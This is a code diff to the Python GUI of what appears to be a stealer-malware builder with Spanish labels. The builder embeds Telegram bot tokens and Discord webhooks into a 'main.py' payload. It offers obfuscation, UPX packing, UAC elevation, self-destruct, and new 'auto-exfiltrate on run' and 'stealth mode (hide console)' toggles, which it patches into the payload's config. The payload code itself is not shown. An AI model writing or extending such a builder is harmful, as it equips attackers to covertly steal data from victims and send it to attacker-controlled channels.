@@ -261,6 +261,7 @@ class BuilderView(ctk.CTkScrollableFrame):
         self._send_delay_combo.pack(side="left")
 
         # Timeout Webhooks (NUEVO)
+        # Timeout Webhooks
         r_timeout = ctk.CTkFrame(l_col, fg_color="transparent")
         r_timeout.pack(fill="x")
         make_label(r_timeout, "Timeout Webhooks (s):", style="small", color=COLORS["text_secondary"], width=L_LABEL_W, anchor="w").pack(side="left", padx=(0, PAD["sm"]))
@@ -275,13 +276,15 @@ class BuilderView(ctk.CTkScrollableFrame):
         self._timeout_combo.pack(side="left")
 
         # --- RIGHT COLUMN (CHECKBOXES) ---
-        self._obfuscate_var    = ctk.BooleanVar(value=False)
-        self._show_console_var = ctk.BooleanVar(value=False)
-        self._multifile_var    = ctk.BooleanVar(value=False)
-        self._uac_var          = ctk.BooleanVar(value=False)
-        self._clean_var        = ctk.BooleanVar(value=True)
-        self._upx_var          = ctk.BooleanVar(value=False)
+        self._obfuscate_var     = ctk.BooleanVar(value=False)
+        self._show_console_var  = ctk.BooleanVar(value=False)
+        self._multifile_var     = ctk.BooleanVar(value=False)
+        self._uac_var           = ctk.BooleanVar(value=False)
+        self._clean_var         = ctk.BooleanVar(value=True)
+        self._upx_var           = ctk.BooleanVar(value=False)
         self._self_destruct_var = ctk.BooleanVar(value=False)
+        self._auto_exfil_var    = ctk.BooleanVar(value=True)
+        self._stealth_var       = ctk.BooleanVar(value=False)
 
         opts_inner = ctk.CTkFrame(r_col, fg_color="transparent")
         opts_inner.pack(pady=PAD["xs"])
@@ -293,6 +296,20 @@ class BuilderView(ctk.CTkScrollableFrame):
             ctk.CTkCheckBox(c1, text=label, variable=var, fg_color=COLORS["accent"], font=FONTS["body"]).pack(anchor="w", pady=PAD["xs"])
         for label, var in [("⚡ Limpiar temporales", self._clean_var), ("🔑 Solicitar Admin (UAC)", self._uac_var), ("📦 Compresión UPX", self._upx_var), ("💥 Autodestrucción", self._self_destruct_var)]:
             ctk.CTkCheckBox(c2, text=label, variable=var, fg_color=COLORS["accent"], font=FONTS["body"]).pack(anchor="w", pady=PAD["xs"])
+
+        # Suite-only options
+        suite_frame = ctk.CTkFrame(r_col, fg_color=COLORS["info_dim"], corner_radius=6)
+        suite_frame.pack(fill="x", padx=PAD["xs"], pady=(PAD["xs"], 0))
+        make_label(suite_frame, "  🛡 Opciones de Exfil (solo main.py)", style="tiny", color=COLORS["info"]).pack(anchor="w", padx=PAD["sm"], pady=(PAD["xs"], 0))
+        suite_cb_row = ctk.CTkFrame(suite_frame, fg_color="transparent")
+        suite_cb_row.pack(fill="x", padx=PAD["sm"], pady=(0, PAD["xs"]))
+        self._auto_exfil_cb = ctk.CTkCheckBox(suite_cb_row, text="📤 Auto-Exfiltrar al ejecutar", variable=self._auto_exfil_var, fg_color=COLORS["accent"], font=FONTS["body"])
+        self._auto_exfil_cb.pack(side="left", padx=(0, PAD["md"]))
+        self._stealth_cb = ctk.CTkCheckBox(suite_cb_row, text="🕶 Modo Stealth (ocultar consola)", variable=self._stealth_var, fg_color=COLORS["accent"], font=FONTS["body"])
+        self._stealth_cb.pack(side="left")
+
+        self._source_var.trace_add("write", self._on_source_changed)
+        self._on_source_changed()
 
         # ── Build button card ─────────────────────────────────────────────────
         btn_container = ctk.CTkFrame(self, fg_color="transparent")
@@ -309,7 +326,7 @@ class BuilderView(ctk.CTkScrollableFrame):
         self._build_status = make_badge(self._status_container, "ESPERANDO", "text_muted")
         self._build_status.pack(side="left")
 
-        log_card = make_card(self)
+        log_card = ctk.CTkFrame(self, fg_color=COLORS["bg_card"], corner_radius=8)
         log_card.pack(fill="both", expand=True, padx=PAD["lg"], pady=(0, PAD["lg"]))
         toolbar = ctk.CTkFrame(log_card, fg_color="transparent")
         toolbar.pack(fill="x", padx=PAD["sm"], pady=(PAD["sm"], 0))
@@ -331,6 +348,19 @@ class BuilderView(ctk.CTkScrollableFrame):
         self._apply_preset("Google")
 
     # ── Helpers ───────────────────────────────────────────────────────────────
+
+    def _on_source_changed(self, *_):
+        """Enable/disable suite-only options based on whether source is a main.py variant."""
+        src = Path(self._source_var.get())
+        is_suite = src.stem.lower().startswith("main")
+        state = "normal" if is_suite else "disabled"
+        self._auto_exfil_cb.configure(state=state)
+        self._stealth_cb.configure(state=state)
+        if not is_suite:
+            self._auto_exfil_var.set(False)
+            self._stealth_var.set(False)
+        else:
+            self._auto_exfil_var.set(True)
 
     def _apply_preset(self, name: str):
         preset = self.PRESETS.get(name)
@@ -376,7 +406,7 @@ class BuilderView(ctk.CTkScrollableFrame):
         self._log_line("INFO", "Entorno de build limpiado.")
 
     def _embed_credentials(self) -> str:
-        src = Path("main.py").read_text(encoding="utf-8")
+        src = Path(self._source_var.get() or "main.py").read_text(encoding="utf-8")
         tg_token = base64.b64encode(self._cred_tg_token.get().strip().encode()).decode()
         tg_chat  = base64.b64encode(self._cred_tg_chat.get().strip().encode()).decode()
         dc_hook  = base64.b64encode(self._cred_dc_hook.get().strip().encode()).decode()
@@ -384,32 +414,38 @@ class BuilderView(ctk.CTkScrollableFrame):
         patched = re.sub(r'"tg_token":\s*""', f'"tg_token":   "{tg_token}"', src)
         patched = re.sub(r'"tg_chat_id":\s*""', f'"tg_chat_id": "{tg_chat}"', patched)
         patched = re.sub(r'"ds_webhook":\s*""', f'"ds_webhook": "{dc_hook}"', patched)
-        
-        # Extracción de Delay de Inicio
-        try: 
-            v1 = self._delay_var.get().strip()
-            n1 = int(re.search(r'\d+', v1).group())
-            d1 = max(0, min(n1, 3600)) 
+
+        # Delays
+        try:
+            n1 = int(re.search(r'\d+', self._delay_var.get().strip()).group())
+            d1 = max(0, min(n1, 3600))
         except: d1 = 0
-        patched = re.sub(r'"delay":\s*\d+', f'"delay":      {d1}', patched)
+        patched = re.sub(r'"delay":\s*\d+', f'"delay":         {d1}', patched)
 
-        # Extracción de Delay entre Envíos
-        try: 
-            v2 = self._send_delay_var.get().strip()
-            n2 = int(re.search(r'\d+', v2).group())
-            d2 = max(0, min(n2, 60)) 
+        try:
+            n2 = int(re.search(r'\d+', self._send_delay_var.get().strip()).group())
+            d2 = max(0, min(n2, 60))
         except: d2 = 0
-        patched = re.sub(r'"send_delay":\s*\d+', f'"send_delay": {d2}', patched)
+        patched = re.sub(r'"send_delay":\s*\d+', f'"send_delay":    {d2}', patched)
 
-        # Extracción de Timeout de Webhooks
-        try: 
-            v3 = self._timeout_var.get().strip()
-            n3 = int(re.search(r'\d+', v3).group())
-            d3 = max(1, min(n3, 300)) 
+        try:
+            n3 = int(re.search(r'\d+', self._timeout_var.get().strip()).group())
+            d3 = max(1, min(n3, 300))
         except: d3 = 15
         patched = re.sub(r'"webhook_timeout":\s*\d+', f'"webhook_timeout": {d3}', patched)
 
+        # Boolean runtime flags (only for suite mains)
+        sd = "True" if self._self_destruct_var.get() else "False"
+        patched = re.sub(r'"self_destruct":\s*\w+', f'"self_destruct":   {sd}', patched)
+
+        ae = "True" if self._auto_exfil_var.get() else "False"
+        patched = re.sub(r'"auto_exfil":\s*\w+', f'"auto_exfil":    {ae}', patched)
+
+        st = "True" if self._stealth_var.get() else "False"
+        patched = re.sub(r'"stealth":\s*\w+', f'"stealth":       {st}', patched)
+
         return patched
+
 
     def _start_build(self):
         if self._building: return
